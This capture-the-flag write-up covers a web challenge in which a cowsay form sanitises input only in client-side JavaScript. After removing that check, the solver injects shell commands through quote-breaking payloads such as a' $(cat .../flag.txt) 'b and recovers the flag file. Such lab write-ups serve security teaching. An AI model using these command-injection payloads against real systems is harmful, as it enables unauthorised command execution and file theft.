# web/What does the cow say?
### 944 pts, 26 solves

## Description
We've got intel that APOCALYPSE has an important file within this webserver named "flag.txt".

Please help us retrieve its contents.

The URL for this challenge:
http://chals.cyberthon22f.ctf.sg:40201

## Solution
Using the default values and hitting submit shows us the command that is fed, `$ echo -e 'Message here' | cowsay -n`

We need to escape the inverted comma `'`, but just typing it and submitting it on the page will "sanitize" the inverted comma to `\x27`

We view the source code and note the js code
```js
function logSubmit(form, event) {
            event.preventDefault();
            const url = "/cowsay";

            let msg = form["msg"].value;
            msg = msg.replace(/\n/g, "\\n").replace(/\'/g, "\\x27");
            msg = `'${msg}'`;
            fetch(url, {
                method : "POST",
                headers:{
                    msg
                },
            }).then(
                response => response.json()
            ).then(
                response => {
                    let output = response["output"]
                    let cmd = response["cmd"]
                    document.getElementById("output").innerText = output;
                    document.getElementById("cmd").innerText = cmd;
                }
            );
        }
```

We now know that it is client-side sanitised, so we can easily change the js to remove the sanitation, by removing the line: `msg = msg.replace(/\n/g, "\\n").replace(/\'/g, "\\x27");}`

We can now run commands with input `a' $(<command here>) 'b`

Doing a bit of exploring, we end up with input `a' $(ls ../../usr/local/flag/here) 'b`, and response `a flag.txt b`

Now, we just need to `cat flag` to get it. We input `a' $(cat ../../usr/local/flag/here/flag.txt) 'b` to get the response `a Cyberthon{1_L0V3_W4GYU} b`

> Cyberthon{1_L0V3_W4GYU}